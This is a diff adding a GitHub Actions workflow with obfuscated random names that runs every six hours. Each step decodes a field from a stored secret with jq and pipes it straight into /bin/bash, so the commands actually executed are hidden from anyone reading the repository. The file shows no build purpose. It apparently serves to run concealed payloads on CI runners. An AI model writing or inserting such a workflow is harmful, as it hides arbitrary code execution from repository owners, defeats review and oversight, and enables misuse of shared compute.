@@ -1,0 +1,20 @@
+name: dartrest39
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dartrest39
+        env:
+          g458: ${{ secrets.g458 }}
+        run: |
+          echo $g458 | jq -r .yjlq9571 | /bin/bash
+          echo $f53288 | jq -r .lzzi05 | /bin/bash
+          echo $x67685 | jq -r .r95 | /bin/bash
+          echo $rrbo5 | jq -r .qruea486 | /bin/bash
+          echo $dbem286 | jq -r .cq6884 | /bin/bash
+
